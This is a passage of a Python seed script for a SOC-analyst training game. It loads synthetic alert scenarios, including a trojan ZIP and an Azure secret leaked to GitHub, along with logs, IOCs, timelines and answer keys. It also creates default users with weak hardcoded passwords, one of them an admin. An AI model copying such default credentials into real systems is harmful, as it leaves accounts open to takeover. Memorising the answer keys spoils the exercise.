        {"event_time": "2024-12-15 11:00:30", "event_type": "Malware Confirmed", "description": "ZIP contains .pdf.exe - Trojan.GenericKD detected", "source": "Manual Analysis", "severity": "critical"},
    ]
},

{
    "title": "Azure AD - Service Principal Secret Exposed in Public Repo",
    "category": "Cloud Security",
    "severity": "critical",
    "description": "GitHub secret scanning detected Azure AD Service Principal credentials committed to a public repository. Credentials provide access to production subscription.",
    "source": "GitHub Secret Scanning / Azure Monitor",
    "source_ip": "140.82.114.4",
    "dest_ip": "management.azure.com",
    "hostname": "Azure AD / GitHub",
    "username": "dev.pipeline (SPN)",
    "expected_verdict": "true_positive",
    "points": 200,
    "hint": "Secret exposure in public repos is instant compromise - assume credentials used immediately. Check Azure Activity Log for anomalous SPN usage.",
    "solution_explanation": "True positive credential exposure. SPN secret committed to public GitHub repo. Azure Activity Log shows external IP used credentials within minutes of commit. Revoke immediately.",
    "host_info": json.dumps({"hostname": "Azure Production Subscription", "service": "Azure AD + GitHub", "spn_permissions": "Contributor on Production subscription", "criticality": "Critical"}),
    "user_info": json.dumps({"username": "dev.pipeline", "type": "Service Principal", "github_committer": "junior_dev", "credential_age": "Committed 47 minutes ago"}),
    "mitre_mapping": json.dumps({"tactic": "Initial Access", "technique": "T1552.001", "name": "Unsecured Credentials: Credentials In Files", "url": "https://attack.mitre.org/techniques/T1552/001/"}),
    "logs": [
        {"log_type": "web", "timestamp": "2024-12-15 16:00:00", "source_ip": "140.82.114.4", "dest_ip": "github.com", "username": "junior_dev", "event_id": "SECRET_SCAN", "raw_log": "GitHub Secret Scanning | SECRET EXPOSED | Repo: corp/infra-config (PUBLIC) | Type: Azure Service Principal | CLIENT_ID: 12345678-... | CLIENT_SECRET: [REDACTED] | TENANT_ID: corp.onmicrosoft.com | Commit: abc123 by junior_dev | Time: 15:13 (47 min ago)", "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 15:18:00", "source_ip": "45.77.200.100", "dest_ip": "management.azure.com", "username": "dev.pipeline", "event_id": "AzureActivity", "raw_log": "Azure Activity Log | SPN Login | App: dev.pipeline | IP: 45.77.200.100 (EXTERNAL - not known CI/CD) | Location: Romania | Actions: ListResources, GetSecrets | 5 minutes after commit - CREDENTIAL SCRAPED", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "45.77.200.100", "description": "External IP using exposed SPN credentials", "malicious": 1},
        {"ioc_type": "url", "value": "https://github.com/corp/infra-config", "description": "Public repo with exposed credentials", "malicious": 0},
    ],
    "timeline": [
        {"event_time": "2024-12-15 15:13:00", "event_type": "Secret Committed", "description": "SPN credentials committed to public GitHub repo", "source": "GitHub", "severity": "critical"},
        {"event_time": "2024-12-15 15:18:00", "event_type": "Credentials Used", "description": "External IP uses exposed SPN to access Azure - 5 min after commit", "source": "Azure Activity Log", "severity": "critical"},
        {"event_time": "2024-12-15 16:00:00", "event_type": "GitHub Alert", "description": "GitHub Secret Scanning notifies team - credentials already used", "source": "GitHub", "severity": "critical"},
    ]
},

]

# ─────────────────────────────────────────────
# SEED FUNCTION
# ─────────────────────────────────────────────

def seed_database():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row

    # Check if already seeded
    count = conn.execute("SELECT COUNT(*) as c FROM alerts").fetchone()['c']
    if count > 0:
        print(f"Database already has {count} alerts. Skipping seed.")
        conn.close()
        return

    # Create default users
    users = [
        ("analyst", hash_password("soc2024"), "analyst@corp.com", "analyst", "#00d4ff", "SOC Analyst L1"),
        ("senior_analyst", hash_password("senior2024"), "senior@corp.com", "senior", "#ff6b35", "Senior Analyst"),
        ("team_lead", hash_password("lead2024"), "lead@corp.com", "admin", "#7c3aed", "Team Lead"),
        ("alice_soc", hash_password("alice2024"), "alice@corp.com", "analyst", "#10b981", "Threat Hunter"),
        ("bob_ir", hash_password("bob2024"), "bob@corp.com", "analyst", "#f59e0b", "IR Specialist"),
    ]

    for u in users:
        try:
            conn.execute(
                "INSERT INTO users (username, password, email, role, avatar_color, badge) VALUES (?,?,?,?,?,?)", u
            )
        except Exception:
            pass

    conn.commit()

    # Seed scenarios
    for scenario in SCENARIOS:
        logs = scenario.pop("logs", [])
        iocs = scenario.pop("iocs", [])
        timeline = scenario.pop("timeline", [])

        # Set status randomly (mostly open)
        scenario["status"] = random.choice(["open", "open", "open", "in_progress"])

        cursor = conn.execute("""
            INSERT INTO alerts (title, description, category, severity, status, source, source_ip, dest_ip,
                hostname, username, host_info, user_info, mitre_mapping, expected_verdict, points, hint,
                solution_explanation, created_at)
            VALUES (:title, :description, :category, :severity, :status, :source, :source_ip, :dest_ip,
                :hostname, :username, :host_info, :user_info, :mitre_mapping, :expected_verdict, :points,
                :hint, :solution_explanation,
                datetime('now', '-' || (abs(random() % 30)) || ' days'))
        """, scenario)

        alert_id = cursor.lastrowid

        for log in logs:
            conn.execute("""
                INSERT INTO logs (alert_id, log_type, timestamp, source_ip, dest_ip, username, event_id, raw_log, highlighted)
                VALUES (?,?,?,?,?,?,?,?,?)
            """, [alert_id, log.get("log_type",""), log.get("timestamp",""), log.get("source_ip",""),
                  log.get("dest_ip",""), log.get("username",""), log.get("event_id",""),
                  log.get("raw_log",""), log.get("highlighted",0)])

        for ioc in iocs:
            conn.execute("""
                INSERT INTO iocs (alert_id, ioc_type, value, description, malicious)
                VALUES (?,?,?,?,?)
            """, [alert_id, ioc["ioc_type"], ioc["value"], ioc.get("description",""), ioc.get("malicious",1)])

        for event in timeline:
            conn.execute("""
                INSERT INTO timeline (alert_id, event_time, event_type, description, source, severity)
                VALUES (?,?,?,?,?,?)
            """, [alert_id, event["event_time"], event["event_type"],
                  event["description"], event["source"], event["severity"]])

    conn.commit()
    conn.close()
    print(f"✅ Seeded {len(SCENARIOS)} alert scenarios.")

if __name__ == "__main__":
    seed_database()
